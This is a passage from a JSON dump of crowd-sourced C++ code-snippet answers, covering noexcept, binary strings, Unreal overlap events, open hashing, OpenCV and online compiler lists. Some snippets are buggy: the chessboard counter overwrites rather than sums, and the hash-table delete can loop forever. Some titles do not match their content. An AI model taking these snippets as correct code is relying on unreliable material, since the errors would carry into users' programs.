    "description": "#include <iostream> #include <utility> #include <vector>   void may_throw(); void no_throw() noexcept; auto lmay_throw = []{}; auto lno_throw = []() noexcept {}; class T{ public:   ~T(){} // dtor prevents move ctor          // copy ctor is noexcept }; class U{ public:   ~U(){} // dtor prevents move ctor          // copy ctor is noexcept(false)   std::vector<int> v; }; class V{ public:   std::vector<int> v; };   int main() {  T t;  U u;  V v;    std::cout << std::boolalpha            << \"Is may_throw() noexcept? \" << noexcept(may_throw()) << '\\n'            << \"Is no_throw() noexcept? \" << noexcept(no_throw()) << '\\n'            << \"Is lmay_throw() noexcept? \" << noexcept(lmay_throw()) << '\\n'            << \"Is lno_throw() noexcept? \" << noexcept(lno_throw()) << '\\n'            << \"Is ~T() noexcept? \" << noexcept(std::declval<T>().~T()) << '\\n'            // note: the following tests also require that ~T() is noexcept because            // the expression within noexcept constructs and destroys a temporary            << \"Is T(rvalue T) noexcept? \" << noexcept(T(std::declval<T>())) << '\\n'            << \"Is T(lvalue T) noexcept? \" << noexcept(T(t)) << '\\n'            << \"Is U(rvalue U) noexcept? \" << noexcept(U(std::declval<U>())) << '\\n'            << \"Is U(lvalue U) noexcept? \" << noexcept(U(u)) << '\\n'              << \"Is V(rvalue V) noexcept? \" << noexcept(V(std::declval<V>())) << '\\n'            << \"Is V(lvalue V) noexcept? \" << noexcept(V(v)) << '\\n';   }\nc++ noexcept\n",
    "reg_date": "2021-10-12T11:42:18.000Z"
  },
  {
    "id": 3169,
    "keyword": null,
    "link": null,
    "title": " non stoichiometric nacl is yellow",
    "description": "#include<iostream.h> #include<conio.h> #include<iomanip.h> c++ is dead who cares bout it\n",
    "reg_date": "2021-10-12T11:42:18.000Z"
  },
  {
    "id": 3170,
    "keyword": null,
    "link": null,
    "title": " not declared in this scope c++",
    "description": "expected primary-expression before ',' token \n",
    "reg_date": "2021-10-12T11:42:18.000Z"
  },
  {
    "id": 3171,
    "keyword": null,
    "link": null,
    "title": " npos in cpp",
    "description": "found = str.find(str2);  if (found != std::string::npos)     std::cout << \"first 'needle' found at: \" << int(found) << std::endl;\n",
    "reg_date": "2021-10-12T11:42:18.000Z"
  },
  {
    "id": 3172,
    "keyword": null,
    "link": null,
    "title": " null c++",
    "description": "//NULL is equal to 0 #include <iostream> using namespace std; int main(){   int x = NULL;   int y = 0;   cout << y << endl; // Outputs 0   cout << x << endl; // Outputs 0   return 0; }\n",
    "reg_date": "2021-10-12T11:42:19.000Z"
  },
  {
    "id": 3173,
    "keyword": null,
    "link": null,
    "title": " num c++",
    "description": "#include <iostream> using namespace std;   int main () {    // number definition:    short  s;    int    i;    long   l;    float  f;    double d;        // number assignments;    s = 10;          i = 1000;        l = 1000000;     f = 230.47;      d = 30949.374;        // number printing;    cout << \"short  s :\" << s << endl;    cout << \"int    i :\" << i << endl;    cout << \"long   l :\" << l << endl;    cout << \"float  f :\" << f << endl;    cout << \"double d :\" << d << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:42:19.000Z"
  },
  {
    "id": 3174,
    "keyword": null,
    "link": null,
    "title": " number is even or odd c++",
    "description": "     if ( n % 2 == 0)         cout << n << \" is even.\";     else         cout << n << \" is odd.\"; \n",
    "reg_date": "2021-10-12T11:42:19.000Z"
  },
  {
    "id": 3175,
    "keyword": null,
    "link": null,
    "title": " number of digits in int c++",
    "description": "int length = 1; int x = 234567545; while ( x /= 10 )    length++; \nint iNums = 12345; int iNumsSize = 5; for (int i=iNumsSize-1; i>=0; i--) {     int y = pow(10, i);     int z = iNums/y;     int x2 = iNums / (y * 10);     printf(\"%d-\",z - x2*10 ); }\n",
    "reg_date": "2021-10-12T11:42:19.000Z"
  },
  {
    "id": 3176,
    "keyword": null,
    "link": null,
    "title": " number of squares with odd side length on chessboard",
    "description": "#include <iostream> using namespace std;  int main()  { \tios_base::sync_with_stdio(false); \tcin.tie(NULL); \tint t;// no. of test cases \tcin>>t; \twhile(t--) \t{ \t    int n; \t    cin>>n;// no. of square in a row or a coloumn of chess board \t    int i=1; \t    int ans=0; \t    while(i<=n) \t    { \t        ans=pow((n-i+1),2); \t        i=i+2; \t    } \t    cout<<ans<<endl; \t} \treturn 0; } \n",
    "reg_date": "2021-10-12T11:42:19.000Z"
  },
  {
    "id": 3177,
    "keyword": null,
    "link": null,
    "title": " number pattern in cpp",
    "description": "#include <iostream> using namespace std;  int main() {     int rows, count = 0, count1 = 0, k = 0;      cout << \"Enter number of rows: \";     cin >> rows;      for(int i = 1; i <= rows; ++i)     {         for(int space = 1; space <= rows-i; ++space)         {             cout << \"  \";             ++count;         }          while(k != 2*i-1)         {             if (count <= rows-1)             {                 cout << i+k << \" \";                 ++count;             }             else             {                 ++count1;                 cout << i+k-2*count1 << \" \";             }             ++k;         }         count1 = count = k = 0;          cout << endl;     }     return 0; } \n",
    "reg_date": "2021-10-12T11:42:19.000Z"
  },
  {
    "id": 3178,
    "keyword": null,
    "link": null,
    "title": " number to binary string c++",
    "description": "std::string str = std::bitset<8>(123).to_string(); \nauto int_bits_size = 32; // maximum number of bits for the integer auto some_integer = 123456789; std::string str = std::bitset<int_bits_size>(some_integer).to_string();\n  ==== Convert number to binary string C++ ======  int n = 100;  string s1=\"\" //Method 1:  string s1 = bitset<8>(n).to_string(); // 01100100 //Method 2  while(n) {  \ts1 += (n%2) + '0';     n /= 2;  }  reverse(s1.begin(),s1.end()); // 1100100\n",
    "reg_date": "2021-10-12T11:42:19.000Z"
  },
  {
    "id": 3179,
    "keyword": null,
    "link": null,
    "title": " number triangle   c++",
    "description": "1 2 3 4 5 6 7 8 9 10 11 12 13 14 15\n#include<bits/stdc++.h> using namespace std; int main() { \tint n; \tcin>>n;\t \tfor(int i=1;i<=n;i++){ \t\tfor(int j=1;j<=n;j++){ \t\t\tif(j<=n-i) \t\t\t{ \t\t\t\tcout<<\" \"; \t\t\t}else{ \t\t\t\tcout<<\"*\"; \t\t\t} \t\t\t \t\t}cout<<endl; \t} }\n",
    "reg_date": "2021-10-12T11:42:19.000Z"
  },
  {
    "id": 3180,
    "keyword": null,
    "link": null,
    "title": " number triangle   in c++",
    "description": "#include<bits/stdc++.h> using namespace std; int main() { \tint n; \tcin>>n; \tfor(int i=1;i<=n;i++) \t{ \t\tfor(int j=1;j<=n-i;j++) \t\t{ \t\t\tcout<<\" \"; \t\t} \t\tfor(int j=1;j<=i;j++) \t\t{ \t\t\tcout<<j<<\" \"; \t\t} \t\tcout<<endl; \t} \treturn 0;\t\t\t }\n",
    "reg_date": "2021-10-12T11:42:19.000Z"
  },
  {
    "id": 3181,
    "keyword": null,
    "link": null,
    "title": " of c++ bind class member function",
    "description": "// bind example #include <iostream>     // std::cout #include <functional>   // std::bind  // a function: (also works with function object: std::divides<double> my_divide;) double my_divide (double x, double y) {return x/y;}  struct MyPair {   double a,b;   double multiply() {return a*b;} };  int main () {   using namespace std::placeholders;    // adds visibility of _1, _2, _3,...    // binding functions:   auto fn_five = std::bind (my_divide,10,2);               // returns 10/2   std::cout << fn_five() << '\\n';                          // 5    auto fn_half = std::bind (my_divide,_1,2);               // returns x/2   std::cout << fn_half(10) << '\\n';                        // 5    auto fn_invert = std::bind (my_divide,_2,_1);            // returns y/x   std::cout << fn_invert(10,2) << '\\n';                    // 0.2    auto fn_rounding = std::bind<int> (my_divide,_1,_2);     // returns int(x/y)   std::cout << fn_rounding(10,3) << '\\n';                  // 3    MyPair ten_two {10,2};    // binding members:   auto bound_member_fn = std::bind (&MyPair::multiply,_1); // returns x.multiply()   std::cout << bound_member_fn(ten_two) << '\\n';           // 20    auto bound_member_data = std::bind (&MyPair::a,ten_two); // returns ten_two.a   std::cout << bound_member_data() << '\\n';                // 10    return 0; }\n",
    "reg_date": "2021-10-12T11:42:20.000Z"
  },
  {
    "id": 3182,
    "keyword": null,
    "link": null,
    "title": " omp multiple reductions",
    "description": "#pragma omp parallel for default(shared) reduction(+:sum,result) ...\n",
    "reg_date": "2021-10-12T11:42:20.000Z"
  },
  {
    "id": 3183,
    "keyword": null,
    "link": null,
    "title": " on component begin overlap c++",
    "description": "UFUNCTION() void OnOverlapEnd(class UPrimitiveComponent* OverlappedComp, class AActor* OtherActor, class UPrimitiveComponent* OtherComp, int32 OtherBodyIndex);\n// Signature for OnOverlapBegin UFUNCTION() void OnOverlapBegin(UPrimitiveComponent* OverlappedComp, AActor* OtherActor, UPrimitiveComponent* OtherComp, int32 OtherBodyIndex, bool bFromSweep, const FHitResult& SweepResult);  // In the constructor make sure to use AddDynamic to handle this function dynamically TriggerComp->OnComponentBeginOverlap.AddDynamic(this, &AClass::OnOverlapBegin);\nUFUNCTION() void OnOverlapBegin(class UPrimitiveComponent* OverlappedComp, class AActor* OtherActor, class UPrimitiveComponent* OtherComp, int32 OtherBodyIndex, bool bFromSweep, const FHitResult& SweepResult);\n",
    "reg_date": "2021-10-12T11:42:20.000Z"
  },
  {
    "id": 3184,
    "keyword": null,
    "link": null,
    "title": " on component end overlap c++",
    "description": "UFUNCTION() void OnOverlapEnd(class UPrimitiveComponent* OverlappedComp, class AActor* OtherActor, class UPrimitiveComponent* OtherComp, int32 OtherBodyIndex);\n",
    "reg_date": "2021-10-12T11:42:20.000Z"
  },
  {
    "id": 3185,
    "keyword": null,
    "link": null,
    "title": " oncomponentbeginoverlap ue4 c++",
    "description": "// Signature for OnOverlapBegin UFUNCTION() void OnOverlapBegin(UPrimitiveComponent* OverlappedComp, AActor* OtherActor, UPrimitiveComponent* OtherComp, int32 OtherBodyIndex, bool bFromSweep, const FHitResult& SweepResult);  // In the constructor make sure to use AddDynamic to handle this function dynamically TriggerComp->OnComponentBeginOverlap.AddDynamic(this, &AClass::OnOverlapBegin);\n",
    "reg_date": "2021-10-12T11:42:20.000Z"
  },
  {
    "id": 3186,
    "keyword": null,
    "link": null,
    "title": " oncomponentendoverlap ue4 c++",
    "description": "// Signature for OnOverlapEnd UFUNCTION() void OnOverlapEnd(UPrimitiveComponent* OverlappedComponent, AActor* OtherActor, UPrimitiveComponent* OtherComp, int32 OtherBodyIndex);  // In the constructor make sure to use AddDynamic to handle this function dynamically TriggerComp->OnComponentEndOverlap.AddDynamic(this, &AClass::OnOverlapEnd);\n",
    "reg_date": "2021-10-12T11:42:20.000Z"
  },
  {
    "id": 3187,
    "keyword": null,
    "link": null,
    "title": " one dimensiol array to two dimen c++",
    "description": "int arrayOne[100]; /// One dimensional int arrayTwo[10][10];  for(int i = 0;i<10;i++){  for(int j = 0;j<10;j++){    arrayTwo[i][j] = arrayOne[(i * 10) + j];    //replace 10 width the width of the array when its multidimensional  } }  //pee pee poo poo :))))(((\n",
    "reg_date": "2021-10-12T11:42:20.000Z"
  },
  {
    "id": 3188,
    "keyword": null,
    "link": null,
    "title": " one line if statement c++",
    "description": "a = (x > y) ? z : y;  /* Same as */  if (x > y) {     a = z; } else {     a = y; }\nx = condition ? expression1 : expression2  // Example: double x = (1 > 0) ? 10 : 20; // put any value\n",
    "reg_date": "2021-10-12T11:42:20.000Z"
  },
  {
    "id": 3189,
    "keyword": null,
    "link": null,
    "title": " online c++ compiler",
    "description": "template < class T, class Alloc = allocator<T> > class vector; // generic template \nThree good online compilers: https://www.onlinegdb.com/online_c++_compiler https://www.programiz.com/cpp-programming/online-compiler/ http://cpp.sh/\n",
    "reg_date": "2021-10-12T11:42:20.000Z"
  },
  {
    "id": 3190,
    "keyword": null,
    "link": null,
    "title": " online c++ graphics compiler",
    "description": "#include<graphics.h> #include <conio.h> int main() {     int gd = DETECT, gm;     initgraph(&gd,&gm, \"C:\\\\tc\\\\bgi\");     circle(300,300,50);     closegraph();     getch(); }\n#include<graphics.h> #include <conio.h> int main() {     int gd = DETECT, gm;     initgraph(&gd,&gm, \"C:\\\\tc\\\\bgi\");     circle(300,300,50);     closegraph();     getch(); }\ntemplate < class T, class Alloc = allocator<T> > class vector; // generic template \n",
    "reg_date": "2021-10-12T11:42:20.000Z"
  },
  {
    "id": 3191,
    "keyword": null,
    "link": null,
    "title": " online compiler c++ with big O calculator",
    "description": "Best Site With auto compile : https://godbolt.org/z/nEo4j7\nfor (int i = 1 ; i <= N-1 ; i++) { \tif ( i < 1 )\t\t//assume always False \t{ \t\tA = i + 10; \t\tB = A + N; \t} \telse if ( i > N)\t\t//assume always False { \tA = i +5; \tB = A + 10; } else { \tA = i + 20; \tB = A + 5; } } \nfor(int i = 0; i < N-1; i++) { if (data[i] >= 0) //Assume always true { Count(i,N); Display(); } else { Console.Write(&ldquo;Wrong input&rdquo;); data[i] = 0; } } public void Count(int first, int second) { hasil = first * second; data[first] = hasil; } public void Display() { for(int y=0; y < N; y++) { Console.Write(data[i]); Console.Write(hasil); } } \nint i=0; int sum=0; while (i < 100) { if (i % 2 == 0) { for (int k = 0; k < n; k++) { sum += vec[i]; } } else { for (int k=0; k<i; k++) { sum += vec[i]; } } }\n Algorithm1(int  n)  for  (i=0;  i<n;  i+=3)  print(i)  \n#include <iostream> using namespace std;  int recursive_sum(int m, int n) { \tif (m == n) \t return m; \treturn m + recursive_sum(m + 1, n); \t }  int main() { \tint m=1, n=5; \tcout<<\"Sum = \"<<recursive_sum(m, n); } \n",
    "reg_date": "2021-10-12T11:42:20.000Z"
  },
  {
    "id": 3192,
    "keyword": null,
    "link": null,
    "title": " online compiler cpp",
    "description": "Good cpp compilers: --------------------- repl.it/languages/cpp www.w3schools.com/cpp/trycpp.asp?filename=demo_helloworld onlinegdb.com/online_c++_compiler programiz.com/cpp-programming/online-complier cpp.sh\ncpp.sh\n",
    "reg_date": "2021-10-12T11:42:21.000Z"
  },
  {
    "id": 3193,
    "keyword": null,
    "link": null,
    "title": " online converter c++ to c",
    "description": "#include<iostream> #include<iomainp> Using namespace std; Int main()   { Int a, b, x, y; Std::cin>>a>>b>>x>>y;  Float m =a/6; Int n =y/6; Int p =y%6; Float k= ((float) n +(float) p/10) ; Float d=x/k; Float f = b/m; Std::cout<<std::fixed<<std::setprecision(1) <<k<<\"\\n\"; Std::cout<<d<<\"\\n\"<<f<<\"\\n\";  If(d>f)  Std::cout<<\"Eligible to win\"; }\nwaterworld \n// C++ program to generate all possible // valid IP addresses from given string #include <bits/stdc++.h> using namespace std;  // Function checks whether IP digits // are valid or not. int is_valid(string ip) { \t// Splitting by \".\" \tvector<string> ips; \tstring ex = \"\"; \tfor (int i = 0; i < ip.size(); i++) { \t\tif (ip[i] == '.') { \t\t\tips.push_back(ex); \t\t\tex = \"\"; \t\t} \t\telse { \t\t\tex = ex + ip[i]; \t\t} \t} \tips.push_back(ex);  \t// Checking for the corner cases \t// cout << ip << endl; \tfor (int i = 0; i < ips.size(); i++) { \t\t// cout << ips[i] <<endl; \t\tif (ips[i].length() > 3 \t\t\t|| stoi(ips[i]) < 0 \t\t\t|| stoi(ips[i]) > 255) \t\t\treturn 0;  \t\tif (ips[i].length() > 1 \t\t\t&& stoi(ips[i]) == 0) \t\t\treturn 0;  \t\tif (ips[i].length() > 1 \t\t\t&& stoi(ips[i]) != 0 \t\t\t&& ips[i][0] == '0') \t\t\treturn 0; \t} \treturn 1; }  // Function converts string to IP address void convert(string ip) { \tint l = ip.length();  \t// Check for string size \tif (l > 12 || l < 4) { \t\tcout << \"Not Valid IP Address\"; \t}  \tstring check = ip; \tvector<string> ans;  \t// Generating different combinations. \tfor (int i = 1; i < l - 2; i++) { \t\tfor (int j = i + 1; j < l - 1; j++) { \t\t\tfor (int k = j + 1; k < l; k++) { \t\t\t\tcheck = check.substr(0, k) + \".\" \t\t\t\t\t\t+ check.substr(k, l - k + 2); \t\t\t\tcheck \t\t\t\t\t= check.substr(0, j) + \".\" \t\t\t\t\t+ check.substr(j, l - j + 3); \t\t\t\tcheck \t\t\t\t\t= check.substr(0, i) + \".\" \t\t\t\t\t+ check.substr(i, l - i + 4);  \t\t\t\t// cout<< check <<endl; \t\t\t\t// Check for the validity of combination \t\t\t\tif (is_valid(check)) { \t\t\t\t\tans.push_back(check); \t\t\t\t\tstd::cout << check << '\\n'; \t\t\t\t} \t\t\t\tcheck = ip; \t\t\t} \t\t} \t} }  // Driver code int main() { \tstring A = \"25525511135\"; \tstring B = \"25505011535\";  \tconvert(A); \tconvert(B);  \treturn 0; }  // This code is contributed by Harshit \n    string word;\n",
    "reg_date": "2021-10-12T11:42:22.000Z"
  },
  {
    "id": 3194,
    "keyword": null,
    "link": null,
    "title": " online ide c++",
    "description": "Online compiler and debugger tool for C/C++ languages https://www.onlinegdb.com/\nThese two are good C++ compilers: https://www.onlinegdb.com/online_c++_compiler https://www.programiz.com/cpp-programming/online-compiler/\nBest Site With auto compile : https://godbolt.org/z/nEo4j7\nIDE Shortcuts: New file : Ctrl-M Run Code : F9 Debug Code : F8 Save Project : Ctrl-S Beautify Code : Ctrl-B Settings Menu : Ctrl-Shift-S Info : Ctrl-I  Editor Shortcuts: showSettingsMenu : Ctrl-, goToNextError : Alt-E goToPreviousError : Alt-Shift-E selectall : Ctrl-A gotoline : Ctrl-L fold : Alt-L|Ctrl-F1 unfold : Alt-Shift-L|Ctrl-Shift-F1 toggleFoldWidget : F2 toggleParentFoldWidget : Alt-F2 foldOther : Alt-0 unfoldall : Alt-Shift-0 findnext : Ctrl-K findprevious : Ctrl-Shift-K selectOrFindNext : Alt-K selectOrFindPrevious : Alt-Shift-K find : Ctrl-F overwrite : Insert selecttostart : Ctrl-Shift-Home gotostart : Ctrl-Home selectup : Shift-Up golineup : Up selecttoend : Ctrl-Shift-End gotoend : Ctrl-End selectdown : Shift-Down golinedown : Down selectwordleft : Ctrl-Shift-Left gotowordleft : Ctrl-Left selecttolinestart : Alt-Shift-Left gotolinestart : Alt-Left|Home selectleft : Shift-Left gotoleft : Left selectwordright : Ctrl-Shift-Right gotowordright : Ctrl-Right selecttolineend : Alt-Shift-Right gotolineend : Alt-Right|End selectright : Shift-Right gotoright : Right selectpagedown : Shift-Pagedown gotopagedown : Pagedown selectpageup : Shift-Pageup gotopageup : Pageup scrollup : Ctrl-Up scrolldown : Ctrl-Down selectlinestart : Shift-Home selectlineend : Shift-End togglerecording : Ctrl-Alt-E replaymacro : Ctrl-Shift-E jumptomatching : Ctrl-P selecttomatching : Ctrl-Shift-P expandToMatching : Ctrl-Shift-M removeline : Ctrl-D duplicateSelection : Ctrl-Shift-D sortlines : Ctrl-Alt-S togglecomment : Ctrl-/ toggleBlockComment : Ctrl-Shift-/ modifyNumberUp : Ctrl-Shift-Up modifyNumberDown : Ctrl-Shift-Down replace : Ctrl-H undo : Ctrl-Z redo : Ctrl-Shift-Z|Ctrl-Y copylinesup : Alt-Shift-Up movelinesup : Alt-Up copylinesdown : Alt-Shift-Down movelinesdown : Alt-Down del : Delete backspace : Shift-Backspace|Backspace cut_or_delete : Shift-Delete removetolinestart : Alt-Backspace removetolineend : Alt-Delete removewordleft : Ctrl-Backspace removewordright : Ctrl-Delete outdent : Shift-Tab indent : Tab blockoutdent : Ctrl-[ blockindent : Ctrl-] transposeletters : Ctrl-T touppercase : Ctrl-U tolowercase : Ctrl-Shift-U expandtoline : Ctrl-Shift-L addCursorAbove : Ctrl-Alt-Up addCursorBelow : Ctrl-Alt-Down addCursorAboveSkipCurrent : Ctrl-Alt-Shift-Up addCursorBelowSkipCurrent : Ctrl-Alt-Shift-Down selectMoreBefore : Ctrl-Alt-Left selectMoreAfter : Ctrl-Alt-Right selectNextBefore : Ctrl-Alt-Shift-Left selectNextAfter : Ctrl-Alt-Shift-Right splitIntoLines : Ctrl-Alt-L alignCursors : Ctrl-Alt-A findAll : Ctrl-Alt-K showKeyboardShortcuts : Ctrl-Alt-H           \nInterviewBit C++ Compiler - https://www.interviewbit.com/online-cpp-compiler/\ntemplate < class T, class Alloc = allocator<T> > class vector; // generic template \n",
    "reg_date": "2021-10-12T11:42:22.000Z"
  },
  {
    "id": 3195,
    "keyword": null,
    "link": null,
    "title": " onoverlapbegin ue4 c++",
    "description": "... void AUnrealCPPCharacter::OnOverlapBegin(class UPrimitiveComponent* OverlappedComp, class AActor* OtherActor, class UPrimitiveComponent* OtherComp, int32 OtherBodyIndex, bool bFromSweep, const FHitResult& SweepResult) { \tif (OtherActor && (OtherActor != this) && OtherComp)  \t{ \t\tGEngine->AddOnScreenDebugMessage(-1, 5.f, FColor::Red, TEXT(\"Overlap Begin\")); \t} }   void AUnrealCPPCharacter::OnOverlapEnd(class UPrimitiveComponent* OverlappedComp, class AActor* OtherActor, class UPrimitiveComponent* OtherComp, int32 OtherBodyIndex) { \tif (OtherActor && (OtherActor != this) && OtherComp)  \t{ \t\tGEngine->AddOnScreenDebugMessage(-1, 5.f, FColor::Red, TEXT(\"Overlap End\")); \t} } \npublic   ...    // declare overlap begin function \tUFUNCTION() \tvoid OnOverlapBegin(class UPrimitiveComponent* OverlappedComp, class AActor* OtherActor, class UPrimitiveComponent* OtherComp, int32 OtherBodyIndex, bool bFromSweep, const FHitResult& SweepResult);  \t// declare overlap end function \tUFUNCTION() \tvoid OnOverlapEnd(class UPrimitiveComponent* OverlappedComp, class AActor* OtherActor, class UPrimitiveComponent* OtherComp, int32 OtherBodyIndex); \nvoid ALightSwitchCodeOnly::OnOverlapBegin(UPrimitiveComponent* OverlappedComp, AActor* OtherActor, UPrimitiveComponent* OtherComp, int32 OtherBodyIndex, bool bFromSweep, const FHitResult& SweepResult)   {       // Other Actor is the actor that triggered the event. Check that is not ourself.       if ( (OtherActor != nullptr ) && (OtherActor != this) && ( OtherComp != nullptr ) )       {           // Turn off the light           PointLight->SetVisibility(false);       }   }\nAUnrealCPPCharacter::AUnrealCPPCharacter() {   ...    // declare overlap events \tTriggerCapsule->OnComponentBeginOverlap.AddDynamic(this, &AUnrealCPPCharacter::OnOverlapBegin);  \tTriggerCapsule->OnComponentEndOverlap.AddDynamic(this, &AUnrealCPPCharacter::OnOverlapEnd);   } \n",
    "reg_date": "2021-10-12T11:42:23.000Z"
  },
  {
    "id": 3196,
    "keyword": null,
    "link": null,
    "title": " onp spoj",
    "description": "/* http://www.codechef.com/problems/ONP */  #include <iostream> #include <stack> #include <vector> #include <stdio.h> using namespace std;  int precedence ( char c ) {  \tswitch ( c ) { \t\tcase '(': \t\t\treturn 1; \t\tcase '+': \t\tcase '-': \t\t\treturn 2; \t\tcase '*': \t\tcase '/': \t\tcase '^': \t\t\treturn 3; \t} \treturn 0;  }  int isop ( char c1 ) { \tif ( c1 == '(' || c1 == '+' || c1 == '-' || c1 == '*' || c1 == '/' || c1 == '^' ) \t\treturn 1; \treturn 0; }  void print(stack<char> &s) { \tif(s.empty()) {        \t\tcout << endl;         \treturn;     \t}  \tchar x= s.top();     \ts.pop();     \tprint(s);     \ts.push(x);     \tcout << x << \" \"; }  int main ( int argc , char * argv[] ) {  \tstack < char > s; \tstring infix; \tint t;  \tcin >> t; \tgetchar(); \twhile ( t-- ) {\t  \t\tgetline ( cin , infix );  \t\tfor ( int i = 0 ; i < infix.length() ; i++ ) { \t\t\tchar ch = infix[i]; \t \t\t\tif ( ch == '(' ) { \t\t\t\ts.push ( ch ); \t\t\t} \t\t\telse if ( isalnum ( ch ) ) { \t\t\t\t\tcout << ch; \t\t\t} \t\t\telse if ( ch == ')' ) { \t\t\t\twhile ( s.top() != '(' ) { \t\t\t\t\tcout << s.top(); \t\t\t\t\ts.pop(); \t\t\t\t} \t\t\t\ts.pop(); \t\t\t} \t\t\telse if ( isop( ch ) ) { \t \t\t\t\twhile ( !s.empty() && precedence ( s.top() ) >= precedence ( ch ) ) { \t\t\t\t\tcout << s.top(); \t\t\t\t\ts.pop(); \t\t\t\t} \t\t\t\ts.push(ch); \t\t\t} \t\t} \t \t\twhile ( ! s.empty() ) { \t\t\tcout << s.top(); \t\t\ts.pop(); \t\t} \t\tcout << endl; \t}  \treturn 0; } \n",
    "reg_date": "2021-10-12T11:42:23.000Z"
  },
  {
    "id": 3197,
    "keyword": null,
    "link": null,
    "title": " oop cpp",
    "description": "OOP = Object-Oriented Programming  - provides a clear structure for the programs - makes the code easier to maintain, modify and debug - allows to create full reusable applications  This topic is wide for a Grepper answer. I encourage you to check the details by yourself.\n",
    "reg_date": "2021-10-12T11:42:23.000Z"
  },
  {
    "id": 3198,
    "keyword": null,
    "link": null,
    "title": " open a url with dev c",
    "description": "system(\"<mybrowser> http://google.com\"); \n#include <windows.h>  void main() {    ShellExecute(NULL, \"open\", \"http://dreamincode.net\",                 NULL, NULL, SW_SHOWNORMAL); }\n%x(open https://google.com) \n",
    "reg_date": "2021-10-12T11:42:23.000Z"
  },
  {
    "id": 3199,
    "keyword": null,
    "link": null,
    "title": " open hashing basic operations",
    "description": "//open hashing , insertion,deletion,searching,displaying #include <iostream>  using namespace std; #define n 5 class node { public:     int data;     node*next; }; node*hasharray[n]; void init() {     for(int i=0;i<n;i++)     {         hasharray[i]=NULL;     } } void addhash(int value) {     node *temp=new node;     int key=value%n;     temp->data=value;     temp->next=hasharray[key];     hasharray[key]=temp; } int deletehash(int value) {     node *temp=new node;     node*ptr=new node;     int key=value%n;     temp=hasharray[key];     if(temp!=NULL)     {         if(temp->data==value)         {             ptr=temp;             hasharray[key]=hasharray[key]->next;             delete ptr;             return 1;         }         else         {             while(temp->next!=NULL)             {                 if(temp->next->data==value)                 {                     ptr=temp->next;                     temp->next=temp->next->next;                     delete ptr;                     return 1;                 }             }         }     }     return 0; } int searchhash(int value) {     int key=value%n;     node *temp=new node;     temp=hasharray[key];     while(temp!=NULL)     {         if(temp->data==value)         {             return 1;         }         temp=temp->next;     }     return 0; } void display() {     for(int i=0;i<n;i++)     {         node *temp=new node;         temp=hasharray[i];         cout<<\"hasharray\"<<\"[\"<<i<<\"]\"<<endl;         while(temp!=NULL)         {             cout<<temp->data<<\" \";             temp=temp->next;         }         cout<<endl;     } }  int main() {     init();     int choice;     while(1)     {         cout<<\"1. insert\"<<endl<<\"2.delete\"<<endl<<\"3.search\"<<endl<<\"4.display\"<<endl<<\"5.exit\"<<endl;         cout<<\"enter the choice\"<<endl;         cin>>choice;         switch(choice)         {         case 1:             {                 int val;                 cout<<\"enter the value you want to insert:\"<<endl;                 cin>>val;                 addhash(val);                 break;             }         case 2:             {                int val;                cout<<\"enter the value you want to delete:\"<<endl;                cin>>val;                int l=deletehash(val);                if(l==1)                {                    cout<<\"value deleted\"<<endl;                }                else                {                    cout<<\"value not found to be deleted\"<<endl;                }                break;             }         case 3:             {               int val;               cout<<\"enter the value to be searched:\"<<endl;               cin>>val;               int l=searchhash(val);               if(l==1)               {                   cout<<\"value found in hash table:\"<<endl;               }               else               {                   cout<<\"value not present\"<<endl;               }               break;             }         case 4:             {                 display();                 break;             }         case 5:             {                 exit(0);              }         default:             {                 cout<<\"wrong choice :\"<<endl;                 cout<<\"--------------------------------------------\"<<endl<<\"please select between 1-5\"<<endl;                 break;             }         }     }      return 0; } \n",
    "reg_date": "2021-10-12T11:42:23.000Z"
  },
  {
    "id": 3200,
    "keyword": null,
    "link": null,
    "title": " open url from dev cpp",
    "description": "system(\"<mybrowser> http://google.com\"); \n%x(open https://google.com) \n",
    "reg_date": "2021-10-12T11:42:23.000Z"
  },
  {
    "id": 3201,
    "keyword": null,
    "link": null,
    "title": " opencv(4.5.1) c:\\users\\appveyor\\appdata\\local\\temp\\1\\pip-req-build-kh7iq4w7\\opencv\\modules\\imgproc\\src\\resize.cpp:4051: error: (-215:assertion failed) !ssize.empty() in function",
    "description": "Error Message::::: error Traceback (most recent call last) in 1 # read the image and resize it to a fixed-size 2 image = cv2.imread(file) ----> 3 image = cv2.resize(image, fixed_size)  error: OpenCV(4.1.1) C:\\projects\\opencv-python\\opencv\\modules\\imgproc\\src\\resize.cpp:3720: error: (-215:Assertion failed) !ssize.empty() in function &lsquo;cv::resize&rsquo;  The Code:::  read the image and resize it to a fixed-size image = cv2.imread(file) image = cv2.resize(image, fixed_size)\nframe = cv2.resize(frame,(224,224),fx=0,fy=0, interpolation = cv2.INTER_CUBIC) \n",
    "reg_date": "2021-10-12T11:42:23.000Z"
  },
  {
    "id": 3202,
    "keyword": null,
    "link": null,
    "title": " opencv combine video",
    "description": "import cv2 import numpy as np  #loads images and gets data img = cv2.imread(\"img.png\") h,w,_ = img.shape      # creates the resulting image with double the size and 3 channels  output = np.zeros((h * 2, w * 2, 3), dtype=\"uint8\")  # copies the image to the top left output[0:h, 0:w] = img  # copies the image to the top right output[0:h, w:w * 2] = img  # copies the image to the bottom left output[h:h * 2, w:w * 2] = img  # copies the image to the bottom right output[h:h * 2, 0:w] = img  \n# creates the resulting image with double the size and 3 channels  output = np.zeros((w+h+h , w + h + h, 3), dtype=\"uint8\")  # top img output[0:h, h:h+w] = img  # left img (rotated 90&deg;) output[h:h+w, 0:h] = np.rot90(img,1)  # right img (rotated 270&deg;) output[h:h + w, h + w:h +w +h] = np.rot90(img,3)   # bottom img (rotated 180&deg;) output[h+w:h+w+h, h:h+w] = np.rot90(img,2)  \n",
    "reg_date": "2021-10-12T11:42:24.000Z"
  },
  {
    "id": 3203,
    "keyword": null,
    "link": null,
    "title": " opencv compile c++",
    "description": "pkg-config --cflags --libs /path/to/opencv.pc //to compile opencv code samples\n",
    "reg_date": "2021-10-12T11:42:24.000Z"
  },
  {
    "id": 3204,
    "keyword": null,
    "link": null,
    "title": " opencv video delay",
